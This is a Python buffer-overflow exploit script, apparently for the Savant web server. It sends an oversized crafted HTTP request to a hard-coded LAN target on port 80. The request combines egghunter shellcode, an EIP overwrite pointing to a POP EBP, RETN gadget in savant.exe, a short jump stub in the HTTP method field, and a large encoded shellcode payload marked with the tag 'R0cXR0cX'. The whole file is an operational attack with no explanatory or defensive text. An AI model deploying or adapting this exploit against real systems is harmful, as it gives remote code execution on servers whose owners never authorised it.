#!/usr/bin/python
import socket

target_address="192.168.100.118"
target_port=80

# EggHunter shellcode looking for R0cXR0cX added to the start of our buffer
badbuffer = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x52\x30\x63\x58\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

badbuffer += "\x41" * (254 - len(badbuffer))
badbuffer += "\x09\x1D\x40" # EIP Overwrite 00401D09 savant.exe POP EBP, RETN

httpmethod = "\xb0\x03\x04\x01\x7B\x14" # MOV AL, 3; ADD AL, 1; JPO 14

# Carving space for shellcode in the Program's memory
buf = "R0cX" + "R0cX"
buf += b""
buf += b"\xbe\x9e\xb9\x0e\x95\xd9\xc3\xd9\x74\x24\xf4\x5d\x2b"
buf += b"\xc9\xb1\x52\x31\x75\x12\x03\x75\x12\x83\x5b\xbd\xec"
buf += b"\x60\x9f\x56\x72\x8a\x5f\xa7\x13\x02\xba\x96\x13\x70"
buf += b"\xcf\x89\xa3\xf2\x9d\x25\x4f\x56\x35\xbd\x3d\x7f\x3a"
buf += b"\x76\x8b\x59\x75\x87\xa0\x9a\x14\x0b\xbb\xce\xf6\x32"
buf += b"\x74\x03\xf7\x73\x69\xee\xa5\x2c\xe5\x5d\x59\x58\xb3"
buf += b"\x5d\xd2\x12\x55\xe6\x07\xe2\x54\xc7\x96\x78\x0f\xc7"
buf += b"\x19\xac\x3b\x4e\x01\xb1\x06\x18\xba\x01\xfc\x9b\x6a"
buf += b"\x58\xfd\x30\x53\x54\x0c\x48\x94\x53\xef\x3f\xec\xa7"
buf += b"\x92\x47\x2b\xd5\x48\xcd\xaf\x7d\x1a\x75\x0b\x7f\xcf"
buf += b"\xe0\xd8\x73\xa4\x67\x86\x97\x3b\xab\xbd\xac\xb0\x4a"
buf += b"\x11\x25\x82\x68\xb5\x6d\x50\x10\xec\xcb\x37\x2d\xee"
buf += b"\xb3\xe8\x8b\x65\x59\xfc\xa1\x24\x36\x31\x88\xd6\xc6"
buf += b"\x5d\x9b\xa5\xf4\xc2\x37\x21\xb5\x8b\x91\xb6\xba\xa1"
buf += b"\x66\x28\x45\x4a\x97\x61\x82\x1e\xc7\x19\x23\x1f\x8c"
buf += b"\xd9\xcc\xca\x03\x89\x62\xa5\xe3\x79\xc3\x15\x8c\x93"
buf += b"\xcc\x4a\xac\x9c\x06\xe3\x47\x67\xc1\xcc\x30\x03\x7d"
buf += b"\xa5\x42\xcb\x7c\x8e\xca\x2d\x14\xe0\x9a\xe6\x81\x99"
buf += b"\x86\x7c\x33\x65\x1d\xf9\x73\xed\x92\xfe\x3a\x06\xde"
buf += b"\xec\xab\xe6\x95\x4e\x7d\xf8\x03\xe6\xe1\x6b\xc8\xf6"
buf += b"\x6c\x90\x47\xa1\x39\x66\x9e\x27\xd4\xd1\x08\x55\x25"
buf += b"\x87\x73\xdd\xf2\x74\x7d\xdc\x77\xc0\x59\xce\x41\xc9"
buf += b"\xe5\xba\x1d\x9c\xb3\x14\xd8\x76\x72\xce\xb2\x25\xdc"
buf += b"\x86\x43\x06\xdf\xd0\x4b\x43\xa9\x3c\xfd\x3a\xec\x43"
buf += b"\x32\xab\xf8\x3c\x2e\x4b\x06\x97\xea\x6b\xe5\x3d\x07"
buf += b"\x04\xb0\xd4\xaa\x49\x43\x03\xe8\x77\xc0\xa1\x91\x83"
buf += b"\xd8\xc0\x94\xc8\x5e\x39\xe5\x41\x0b\x3d\x5a\x61\x1e"

sendbuf = httpmethod + " /%" + badbuffer + '\r\n\r\n' + buf

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(sendbuf)
sock.close()

